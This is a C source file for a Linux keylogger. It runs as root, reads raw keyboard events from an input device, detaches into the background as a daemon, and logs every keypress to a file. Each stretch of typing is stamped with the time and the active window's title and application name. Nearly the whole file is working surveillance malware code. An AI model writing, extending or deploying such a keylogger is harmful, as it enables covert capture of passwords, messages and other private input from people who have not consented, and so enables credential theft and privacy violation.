#include <stdio.h>
#include <fcntl.h>   // open
#include <stdlib.h>
#include <string.h>  // strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  // daemon, close
#include <linux/input.h>
#include <time.h>
#include "key_util.h"
#include "util.h"
#include "options.h"
#include "config.h"
#include <X11/Xlib.h>
#include <X11/Xatom.h>

#define KEY_RELEASE 0
#define KEY_PRESS 1

typedef struct input_event input_event;

static void rootCheck();
static int openKeyboardDeviceFile(char *deviceFile);

/**
 * Exit with return code -1 if user does not have root privileges
 */
static void rootCheck() {
   if (geteuid() != 0) {
      printf("Must run as root\n");
      exit(-1);
   }
}


static void displaycheck(char *win_title, size_t title_len,
                         char *app_name,  size_t app_len)
{
    if (win_title && title_len) win_title[0] = '\0';
    if (app_name && app_len)   app_name[0] = '\0';

    Display *display = XOpenDisplay(NULL);
    if (!display) {
        snprintf(win_title, title_len, "NO_DISPLAY");
        snprintf(app_name, app_len, "NO_DISPLAY");
        return;
    }

    Window root = DefaultRootWindow(display);
    Atom activeAtom = XInternAtom(display, "_NET_ACTIVE_WINDOW", True);
    Atom pidAtom    = XInternAtom(display, "_NET_WM_PID", True);

    Atom type;
    int format;
    unsigned long nitems, bytes_after;
    unsigned char *data = NULL;

    /* ---- active window ---- */
    if (XGetWindowProperty(display, root, activeAtom,
                           0, (~0L), False, AnyPropertyType,
                           &type, &format, &nitems,
                           &bytes_after, &data) != Success || !data) {
        XCloseDisplay(display);
        return;
    }

    Window win = *(Window *)data;
    XFree(data);

    /* ---- window title ---- */
    char *name = NULL;
    if (XFetchName(display, win, &name) > 0 && name) {
        strncpy(win_title, name, title_len - 1);
        win_title[title_len - 1] = '\0';
        XFree(name);
    } else {
        snprintf(win_title, title_len, "UNTITLED");
    }

    /* ---- window PID ---- */
    pid_t pid = -1;
    if (pidAtom != None &&
        XGetWindowProperty(display, win, pidAtom,
                           0, 1, False, XA_CARDINAL,
                           &type, &format, &nitems,
                           &bytes_after, &data) == Success && data) {
        pid = *(pid_t *)data;
        XFree(data);
    }

    /* ---- application name via /proc ---- */
    if (pid > 0) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);

        FILE *f = fopen(path, "r");
        if (f) {
            fgets(app_name, app_len, f);
            fclose(f);
            app_name[strcspn(app_name, "\n")] = '\0';
        } else {
            snprintf(app_name, app_len, "PID_%d", pid);
        }
    } else {
        snprintf(app_name, app_len, "UNKNOWN_APP");
    }

    XCloseDisplay(display);
}

/**
 * Opens the keyboard device file
 *
 * @param  deviceFile   the path to the keyboard device file
 * @return              the file descriptor on success, error code on failure
 */
static int openKeyboardDeviceFile(char *deviceFile) {
   int kbd_fd = open(deviceFile, O_RDONLY);
   if (kbd_fd == -1) {
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

   return kbd_fd;
}

int main(int argc, char **argv) {
   rootCheck();

   Config config;
   parseOptions(argc, argv, &config);

   int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
   assert(kbd_fd > 0);

   FILE *logfile = fopen(config.logFile, "a");
   if (logfile == NULL) {
      LOG_ERROR("Could not open log file");
      exit(-1);
   }

   // We want to write to the file on every keypress, so disable buffering
   setbuf(logfile, NULL);

   // Daemonize process. Don't change working directory but redirect standard
   // inputs and outputs to /dev/null
   if (daemon(1, 0) == -1) {
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

uint8_t shift_pressed = 0;
input_event event;

/* Track last time ANYTHING was written */
static time_t last_write = 0;

while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
    if (event.type == EV_KEY) {
        if (event.value == KEY_PRESS) {

            if (isShift(event.code)) {
                shift_pressed++;
            }

            char *name = getKeyText(event.code, shift_pressed);
            if (strcmp(name, UNKNOWN_KEY) != 0) {

                time_t now = time(NULL);

                if (last_write == 0 || (now - last_write) >= 5) {
                /* End the line */
                    fputs("\r\n\n", logfile);

                    char ts[64];
                    char title[256];
                    char app[64];
                    time_t now = time(NULL);
		    struct tm *lt = localtime(&now);

                    /*
                     * Choose ONE timestamp format below.
                     * Uncomment the one you want to use.
                     */

                    // 1. ISO 8601 (YYYY-MM-DD HH:MM:SS)
                    // strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", lt);

                    // 2. US-style date (MM-DD-YYYY HH:MM:SS)
                    strftime(ts, sizeof(ts), "%m-%d-%Y %H:%M:%S", lt);

                    // 3. Compact numeric (YYYYMMDD_HHMMSS)
                    // strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", lt);

                    // 4. With weekday (Wed 2025-12-24 18:26:02)
                    // strftime(ts, sizeof(ts), "%a %Y-%m-%d %H:%M:%S", lt);

                    // 5. With timezone offset (YYYY-MM-DD HH:MM:SS -0500)
                    // strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S %z", lt);

                    /* ACTIVE FORMAT — CHANGE THIS ONE LINE */
                    // strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", lt);
                    displaycheck(title, sizeof(title), app, sizeof(app));
                    fprintf(logfile, "[%s - %s - %s] ", ts, app, title);
                    fputs(name, logfile);

                } else {
                    fputs(name, logfile);
                }

                last_write = now;

                LOG("%s", name);
            }

        } else if (event.value == KEY_RELEASE) {
            if (isShift(event.code)) {
                shift_pressed--;
            }
        }
    }

    assert(shift_pressed >= 0 && shift_pressed <= 2);
}


   Config_cleanup(&config);
   fclose(logfile);
   close(kbd_fd);
   return 0;
}
